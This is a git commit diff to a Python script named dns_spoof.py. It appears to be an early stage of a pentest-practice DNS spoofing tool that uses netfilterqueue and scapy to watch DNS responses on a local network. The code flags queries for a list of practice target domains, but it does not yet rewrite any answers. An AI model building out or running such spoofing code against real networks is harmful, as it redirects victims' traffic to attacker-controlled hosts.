f1662f88c9b16296eade6fed7eb1ab36e7c23e8d
Vhackenstance <hackenstance@proton.me>
2026-06-03 08:10:16 -0500

    Filter DNSRR for DNSQR.qname to match our list

--- dns_spoof.py
+++ dns_spoof.py
@@ -2,20 +2,29 @@
 # Rebuild
 import netfilterqueue
 from scapy.layers.inet import IP
-from scapy.layers.dns import DNSRR
+from scapy.layers.dns import DNSRR, DNSQR
 
-target_ip_vm = "192.168.63.174"
-target_interface_vm = "Ethernet0"
-new_target_ip = "192.168.63.139"
-target_DN = "www.pentest-standard.org"
+target_ip = "192.168.63.174"
+target_interface = "Ethernet0"
+spoor_ip = "192.168.63.139"
 # 44.238.29.244
 # rrname = 'pentest-standard.org'
 # rdata = 96.126.116.56
 
+target_dns = [
+    "www.pentest-standard.org",
+    "juice-shop.herokuapp.com",
+    "testasp.vulnweb.com"
+]
+
 def process_packet(packet):
     scapy_packet = IP(packet.get_payload())
     if scapy_packet.haslayer(DNSRR):
-        print(scapy_packet.show())
+        qname = scapy_packet[DNSQR].qname
+        for target_dn in target_dns:
+            if target_dn in qname:
+                print("\n[+] we have a Target DN Server to Spoof: ")
+                print(qname + "\n")
         # packet.drop()
     packet.accept()
 
